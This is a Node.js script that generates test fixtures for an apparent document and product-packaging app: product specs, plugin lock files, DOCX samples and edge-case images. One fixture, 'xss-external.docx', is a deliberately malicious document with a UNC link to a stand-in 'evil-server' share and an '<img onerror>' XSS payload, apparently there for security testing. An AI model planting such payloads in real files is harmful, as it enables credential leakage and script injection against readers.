/**
 * Generate all deterministic M0-M5 product, DOCX security, and bitmap fixtures under `fixtures/`.
 */
import { mkdirSync, writeFileSync } from 'node:fs'
import path from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'
import { zipSync, strToU8 } from 'fflate'
import sharp from 'sharp'

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..')
const fixturesDir = path.join(root, 'fixtures')

const specMod = await import(pathToFileURL(path.join(root, 'packages', 'product-spec', 'dist', 'index.js')).href)
const catalogMod = await import(pathToFileURL(path.join(root, 'packages', 'catalog', 'dist', 'index.js')).href)

function writeProductFixture(dirName, options) {
  const dir = path.join(fixturesDir, dirName)
  mkdirSync(path.join(dir, 'locks'), { recursive: true })
  const identity = specMod.deriveProductIdentity({
    productId: options.productId,
    shortHint: options.shortHint,
  })
  const seeds = specMod.deriveThemeSeedsFromDominantColor(options.accentHex)
  const icon = specMod.buildPresetBrandIcon({
    preset: options.iconPreset,
    accentHex: seeds.light.accent,
    label: options.displayName.zh,
  })
  const spec = specMod.ProductSpecSchema.parse({
    schemaVersion: 1,
    revision: options.revision ?? 1,
    appVersion: options.appVersion ?? '0.1.0',
    dataFormatVersion: options.dataFormatVersion ?? 1,
    dshSessionFormatVersion: options.dshSessionFormatVersion ?? 3,
    supportedTargets: options.targets ?? ['win32-x64'],
    identity,
    brand: {
      displayName: options.displayName,
      iconSha256: icon.sha256,
      iconPreset: icon.preset,
      iconDataUrl: icon.dataUrl,
    },
    theme: { seeds },
    shell: {
      defaultPanel: 'home',
      navOrder: ['home'],
      showReadinessBar: true,
      localOnlyToolWebDisabled: options.localOnly ?? true,
    },
    home: {
      layout: options.layout,
      sections: options.sections,
      primaryAction: options.requiredActions[0],
    },
    requiredActions: options.requiredActions,
    optionalActions: options.optionalActions ?? [],
    acceptance: {
      fixtures: options.acceptanceFixtures,
      expectedOutputs: options.expectedOutputs,
    },
  })
  writeFileSync(path.join(dir, 'product.json'), `${JSON.stringify(spec, undefined, 2)}\n`)
  writeFileSync(path.join(dir, 'identity.json'), `${JSON.stringify(specMod.projectRuntimeIdentity(spec), undefined, 2)}\n`)

  for (const target of options.targets ?? ['win32-x64']) {
    const res = catalogMod.resolvePluginCombination({
      target,
      requiredActions: spec.requiredActions,
      optionalActions: spec.optionalActions,
      localOnly: options.localOnly ?? true,
    })
    const lock = catalogMod.buildPlatformLock(res)
    writeFileSync(path.join(dir, 'locks', `plugins.${target}.lock.json`), `${JSON.stringify(lock, undefined, 2)}\n`)
  }
  return spec
}

// 1. Product fixtures (fixed deterministic UUID v4s so coexistence/upgrade/disambiguation tests are 100% reproducible)
const QINGHE_BIDS_ID = '11111111-1111-4111-8111-111111111111'
const QINGHE_DESIGN_ID = '22222222-2222-4222-8222-222222222222'
const QINGHE_BIDS_DUP_ID = '33333333-3333-4333-8333-333333333333'

writeProductFixture('qinghe-bids', {
  productId: QINGHE_BIDS_ID,
  shortHint: 'qinghe-bids',
  displayName: { zh: '青禾投标', en: 'Qinghe Bids' },
  accentHex: '#0f766e',
  iconPreset: 'bid-shield',
  layout: 'list-detail',
  sections: ['deadlines', 'missing-materials', 'bid-preview'],
  requiredActions: ['bid.importRequirements', 'bid.exportResponseDocx'],
  optionalActions: ['calendar.addDeadline'],
  targets: ['win32-x64', 'linux-x64', 'darwin-arm64'],
  acceptanceFixtures: ['fixtures/docx/valid-bid.docx', 'fixtures/docx/scanned-bid.docx'],
  expectedOutputs: ['response.docx'],
})

writeProductFixture('qinghe-design', {
  productId: QINGHE_DESIGN_ID,
  shortHint: 'qinghe-design',
  displayName: { zh: '青禾设计室', en: 'Qinghe Design' },
  accentHex: '#4f46e5',
  iconPreset: 'design-pen',
  layout: 'three-pane',
  sections: ['project-list', 'design-canvas', 'annotations-panel'],
  requiredActions: ['design.importImage', 'design.saveAnnotations', 'design.exportAnnotatedPng'],
  optionalActions: ['design.openPrototypeStudio'],
  targets: ['win32-x64', 'linux-x64', 'darwin-arm64'],
  acceptanceFixtures: ['fixtures/images/exif-rotated-6.jpg', 'fixtures/images/ultra-long-2000x40000.png'],
  expectedOutputs: ['annotated-export.png'],
})

// Same displayName "青禾投标", DIFFERENT productId -> tests shortcut disambiguation!
writeProductFixture('qinghe-bids-dup', {
  productId: QINGHE_BIDS_DUP_ID,
  shortHint: 'qinghe-bids-dup',
  displayName: { zh: '青禾投标', en: 'Qinghe Bids' },
  accentHex: '#0369a1',
  iconPreset: 'workbench-grid',
  layout: 'single-column',
  sections: ['deadlines', 'bid-preview'],
  requiredActions: ['bid.importRequirements', 'bid.exportResponseDocx'],
  targets: ['win32-x64'],
  acceptanceFixtures: ['fixtures/docx/valid-bid.docx'],
  expectedOutputs: ['response.docx'],
})

// Renamed upgrade of qinghe-bids (SAME productId, new displayName "青禾投标 Pro", appVersion 0.2.0)
writeProductFixture('qinghe-bids-v020', {
  productId: QINGHE_BIDS_ID,
  shortHint: 'qinghe-bids',
  displayName: { zh: '青禾投标 Pro', en: 'Qinghe Bids Pro' },
  appVersion: '0.2.0',
  revision: 2,
  dataFormatVersion: 2,
  accentHex: '#0d9488',
  iconPreset: 'bid-shield',
  layout: 'list-detail',
  sections: ['deadlines', 'missing-materials', 'bid-preview', 'recent-sessions'],
  requiredActions: ['bid.importRequirements', 'bid.exportResponseDocx'],
  optionalActions: ['calendar.addDeadline'],
  targets: ['win32-x64'],
  acceptanceFixtures: ['fixtures/docx/valid-bid.docx'],
  expectedOutputs: ['response.docx'],
})

// Downgrade test package (SAME productId as qinghe-bids, lower appVersion 0.0.9 & dataFormatVersion 1)
writeProductFixture('qinghe-bids-downgrade', {
  productId: QINGHE_BIDS_ID,
  shortHint: 'qinghe-bids',
  displayName: { zh: '青禾投标', en: 'Qinghe Bids' },
  appVersion: '0.0.9',
  revision: 1,
  dataFormatVersion: 1,
  accentHex: '#0f766e',
  iconPreset: 'bid-shield',
  layout: 'list-detail',
  sections: ['deadlines', 'bid-preview'],
  requiredActions: ['bid.importRequirements', 'bid.exportResponseDocx'],
  targets: ['win32-x64'],
  acceptanceFixtures: ['fixtures/docx/valid-bid.docx'],
  expectedOutputs: ['response.docx'],
})

// 2. DOCX fixtures
const docxDir = path.join(fixturesDir, 'docx')
mkdirSync(docxDir, { recursive: true })
const CT = '<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="xml" ContentType="application/xml"/></Types>'

writeFileSync(
  path.join(docxDir, 'valid-bid.docx'),
  zipSync({
    '[Content_Types].xml': strToU8(CT),
    'word/document.xml': strToU8(`<?xml version="1.0" encoding="UTF-8"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:w14="http://schemas.microsoft.com/office/word/2010/wordml">
  <w:body>
    <w:p w14:paraId="00000001"><w:r><w:t>青禾智慧园区招标文件</w:t></w:r></w:p>
    <w:p w14:paraId="00000002"><w:r><w:t>投标截止时间：2026-12-20 14:30，逾期不予受理。</w:t></w:r></w:p>
    <w:p w14:paraId="00000003"><w:del><w:r><w:delText>已删除的旧截止时间 2025-01-01</w:delText></w:r></w:del><w:r><w:t>投标人须提供有效 ISO 27001 资质证书复印件。</w:t></w:r></w:p>
    <w:tbl><w:tr><w:tc><w:p w14:paraId="00000004"><w:r><w:t>技术方案评分标准：系统架构完整性（40分）</w:t></w:r></w:p></w:tc></w:tr></w:tbl>
  </w:body>
</w:document>`),
  }),
)

writeFileSync(
  path.join(docxDir, 'scanned-bid.docx'),
  zipSync({
    '[Content_Types].xml': strToU8(CT),
    'word/document.xml': strToU8(`<?xml version="1.0" encoding="UTF-8"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body><w:p><w:r><w:drawing/></w:r></w:p><w:p><w:r><w:drawing/></w:r></w:p></w:body>
</w:document>`),
    'word/media/page1.png': new Uint8Array([137, 80, 78, 71, 13, 10, 26, 10]),
  }),
)

writeFileSync(
  path.join(docxDir, 'mixed-score-table.docx'),
  zipSync({
    '[Content_Types].xml': strToU8(CT),
    'word/document.xml': strToU8(`<?xml version="1.0" encoding="UTF-8"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p><w:r><w:t>本项目招标文件正文说明，投标截止日期为 2026-12-22 10:00，详细评分表见下方截图图片。</w:t></w:r></w:p>
    <w:p><w:r><w:drawing/></w:r></w:p>
  </w:body>
</w:document>`),
    'word/media/score-table.png': new Uint8Array([137, 80, 78, 71, 13, 10, 26, 10]),
  }),
)

// Legacy binary .doc (OLE2 magic header D0 CF 11 E0 A1 B1 1A E1)
writeFileSync(
  path.join(docxDir, 'legacy.doc'),
  Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1, 0x00, 0x00, 0x00, 0x00]),
)

// Encrypted OOXML package (`EncryptionInfo` inside OLE2 / or EncryptedPackage entry)
writeFileSync(
  path.join(docxDir, 'encrypted.docx'),
  zipSync({
    EncryptionInfo: strToU8('encrypted-header'),
    EncryptedPackage: strToU8('ciphertext'),
  }),
)

// Malicious DOCX with external rels, altChunk, UNC path, and script-like text
writeFileSync(
  path.join(docxDir, 'xss-external.docx'),
  zipSync({
    '[Content_Types].xml': strToU8(CT),
    'word/_rels/document.xml.rels': strToU8(`<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="\\\\evil-server\\share\\steal" TargetMode="External"/></Relationships>`),
    'word/document.xml': strToU8(`<?xml version="1.0" encoding="UTF-8"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:altChunk r:id="rId9" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
    <w:p><w:r><w:t>&lt;img src=x onerror=alert(1)&gt; 正常投标要求：须具备三级等保资质，截止时间 2026-12-25 17:00</w:t></w:r></w:p>
  </w:body>
</w:document>`),
  }),
)

// 3. Image fixtures (EXIF Orientation 6 + 2000x40000 ultra-long PNG!)
const imgDir = path.join(fixturesDir, 'images')
mkdirSync(imgDir, { recursive: true })

// EXIF Orientation 6 (90° CW): raw 400x200 image with EXIF Orientation=6 displays as 200x400!
const rotatedJpg = await sharp({
  create: { width: 400, height: 200, channels: 3, background: { r: 15, g: 118, b: 110 } },
})
  .withMetadata({ orientation: 6 })
  .jpeg({ quality: 90 })
  .toBuffer()
writeFileSync(path.join(imgDir, 'exif-rotated-6.jpg'), rotatedJpg)

// Ultra-long 2000x40000 PNG (> Cairo 32,767 px limit, compresses tiny because solid color!)
const ultraLongPng = await sharp({
  create: { width: 2000, height: 40000, channels: 3, background: { r: 248, g: 250, b: 252 } },
  limitInputPixels: 300_000_000,
})
  .png({ compressionLevel: 9 })
  .toBuffer()
writeFileSync(path.join(imgDir, 'ultra-long-2000x40000.png'), ultraLongPng)

console.log('[generate-fixtures] All fixtures generated cleanly under fixtures/.')
